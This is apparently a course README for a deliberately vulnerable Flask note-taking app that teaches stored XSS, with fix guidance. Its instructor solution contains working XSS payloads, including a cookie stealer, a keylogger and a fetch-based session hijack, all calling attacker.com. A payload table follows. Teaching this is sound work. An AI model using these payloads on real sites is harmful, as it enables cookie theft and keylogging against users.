# Stored XSS Demo - TerrierNotes

A hands-on demonstration of stored Cross-Site Scripting (XSS) vulnerabilities for EC521 Introduction to Cybersecurity.

## Overview

This demo teaches students how **stored XSS** attacks work by providing a deliberately vulnerable note-taking application. Notes are saved to the server and displayed without sanitization, allowing attackers to inject malicious JavaScript that affects **all users** who view the note.

**See also:**
- **Reflected XSS** (port 5004): `xss-reflected-app.py` - Non-persistent XSS
- **Encoded** (port 5005): `xss-encoded-app.py` - Output encoding only
- **CSP + HttpOnly** (port 5006): `xss-csp-app.py` - Full protection

## Learning Objectives

- Understand the difference between reflected and stored XSS
- Learn why stored XSS is more dangerous than reflected XSS
- Practice exploiting a stored XSS vulnerability
- Understand the importance of input validation and output encoding

## Setup

### Requirements

- Python 3.7+
- Flask

### Installation

```bash
pip install -r xss-stored-requirements.txt
```

### Running the App

```bash
python xss-stored-app.py
```

Visit `http://localhost:5007` in your browser.

## The Challenge

Create notes with malicious content. Your goal: **Store JavaScript that executes for anyone who views the note and steal their cookies!**

### Hints for Students

1. Try creating a note with normal text - observe how it displays
2. What happens if you include HTML tags in the title or content?
3. Can you make JavaScript execute when someone views your note?
4. There's a secret cookie - can you steal it from other users?
5. Think about how this differs from reflected XSS

## Solution (For Instructors)

<details>
<summary>Click to reveal solution</summary>

### The Vulnerability

Both title and content are rendered with `| safe` in the Jinja2 template:

```html
<!-- VULNERABLE -->
<h1 class="note-title">{{ note.title | safe }}</h1>
<div class="note-content">{{ note.content | safe }}</div>
```

### Exploitation Methods

**Method 1: Basic script tag in note content**
```
<script>alert('Stored XSS!')</script>
```

**Method 2: Image error handler**
```
<img src=x onerror="alert('XSS')">
```

**Method 3: Stealing cookies**
```
<script>
new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```

**Method 4: Keylogger**
```
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://attacker.com/log?k=' + e.key;
}
</script>
```

**Method 5: Session hijacking**
```
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
```

### Attack Scenario

1. Attacker creates a note with malicious JavaScript
2. Attacker shares the note link (or the note appears on the home page)
3. Victim visits the page
4. Malicious script executes in victim's browser
5. Victim's cookie is stolen

</details>

## Stored vs Reflected XSS

| Aspect | Reflected XSS | Stored XSS |
|--------|---------------|------------|
| **Persistence** | Non-persistent | Persistent (stored in database) |
| **Attack vector** | Malicious URL | Stored content |
| **Victim targeting** | Must trick each victim | Affects all viewers |
| **Severity** | Medium | High |
| **Detection** | Easier | Harder |
| **Examples** | Search results, error messages | Comments, posts, profiles |

## Why Stored XSS is More Dangerous

1. **No user interaction required** - Victim just needs to view the page
2. **Affects multiple users** - Everyone who views the content is attacked
3. **Self-propagating potential** - Can create worms (e.g., MySpace Samy worm)
4. **Harder to detect** - Payload isn't in the URL
5. **Persistent damage** - Attack continues until content is removed

## Real-World Examples

- **MySpace (2005)**: Samy worm spread via stored XSS, infecting 1 million profiles in 20 hours
- **Twitter (2010)**: Stored XSS in tweets caused automatic retweets
- **eBay (2015-2016)**: Stored XSS in product listings to redirect users
- **British Airways (2018)**: Payment card data stolen via stored XSS

## Security Vulnerabilities Demonstrated

| Vulnerability | Description |
|--------------|-------------|
| **Stored XSS** | User input stored and displayed without sanitization |
| **No Output Encoding** | HTML/JS special characters not escaped |
| **No Input Validation** | No server-side validation of note content |
| **No CSP** | No Content Security Policy to block inline scripts |
| **No HttpOnly Cookie** | Cookie accessible via JavaScript |

## How to Fix (Discussion Points)

### 1. Output Encoding (Primary Fix)

Never use `| safe` with user input:

```python
# SAFE - escapes HTML
{{ note.content }}

# DANGEROUS - renders raw HTML
{{ note.content | safe }}
```

### 2. Input Validation

Sanitize input before storing:

```python
import bleach

# Strip all HTML tags
clean_content = bleach.clean(content)

# Or allow only safe tags
clean_content = bleach.clean(content, tags=['b', 'i', 'u', 'p'])
```

### 3. Content Security Policy (CSP)

Add HTTP header to block inline scripts:

```python
response.headers['Content-Security-Policy'] = "script-src 'self'"
```

### 4. HttpOnly Cookies

Prevent JavaScript from accessing session cookies:

```python
response.set_cookie("secret", "s3cr3t", httponly=True)
```

## Files

| File | Description |
|------|-------------|
| `xss-stored-app.py` | Flask app with stored XSS vulnerability |
| `xss-stored-requirements.txt` | Python dependencies |
| `xss-stored-README.md` | This documentation |

## Try These Payloads

| Payload | Effect |
|---------|--------|
| `<script>alert('XSS')</script>` | Basic alert box |
| `<script>alert(document.cookie)</script>` | **Steal the secret cookie!** |
| `<img src=x onerror=alert(document.cookie)>` | Cookie theft via event handler |
| `<svg onload=alert('XSS')>` | SVG load event |
| `<body onload=alert('XSS')>` | Body load event |
| `<marquee onstart=alert('XSS')>` | Marquee start event |
| `<div onmouseover=alert('XSS')>Hover me</div>` | Mouse event |

## All Demos in This Repository

| Demo | Port | Description |
|------|------|-------------|
| Cookie Security | 5000 | Cookie manipulation attack |
| SQL Injection | 5001 | Classic SQL injection in login form |
| Blind SQL Injection | 5002 | Boolean-based blind SQL injection |
| Secure SQL | 5003 | SQL injection prevention with prepared statements |
| Reflected XSS | 5004 | Cross-site scripting via search (reflected) |
| XSS Encoded | 5005 | Output encoding only |
| XSS + CSP | 5006 | Full protection with CSP |
| **Stored XSS** | 5007 | Stored XSS in note-taking app (this demo) |

## License

Educational use only - EC521 Boston University
